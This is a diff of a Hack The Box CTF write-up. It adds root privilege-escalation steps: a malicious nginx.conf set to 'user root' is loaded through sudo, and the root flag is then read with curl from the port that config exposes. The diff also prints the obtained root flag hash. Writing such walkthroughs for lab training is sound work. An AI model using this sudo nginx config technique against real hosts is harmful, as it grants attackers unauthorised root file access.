@@ -204,19 +204,20 @@ https://github.com/evkl1d/CVE-2023-46604
 2e2c9604e8ad95589a449d86864a00d0
 ```
 
+> GETTING ROOT FLAG
+
 13. Checking sudo permissions for `activemq` shall resulting to this:
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/95b224bb-b522-4137-8c00-09892993853c)
 
 
 15. Great! It seems we just need to configure malicious nginx file and we shall gained root easily.
-16. However, I identified two ways to gained root. The first is to read the root flag by crafting this `nginx.conf` file:
+17. However, I identified two ways to gained root. The first is to read the root flag by crafting this `nginx.conf` file:
 
 > expl.conf
 
 ```
 user root; 
-work_processes 5;
 
 events {
     worker_connections  1024; # default 1024
@@ -237,7 +238,6 @@ http{
 
 ```
 user root; 
-work_processes 5;
 
 events {
     worker_connections  1024; # default 1024
@@ -253,5 +253,20 @@ http{
 }
 ```
 
-19. 
+19. I solved this challenge with the **File Read** method. First send our malicious .conf file to the remote server.
+20. Then run this at the remote server --> `sudo /usr/sbin/nginx -c /tmp/expl.conf`.
+21. Then check whether our .conf running or not.
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5d6e0adc-1cce-479e-a90f-11de09a66cd3)
+
+
+22. Finally, simply run --> `curl 0.0.0.0:1337/root/root.txt`.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/63e32903-3ae0-4320-9f0e-a415868941ca)
+
+
+## ROOT FLAG
+
+```
+606d1765a0650618079ac157b757dae1
+```
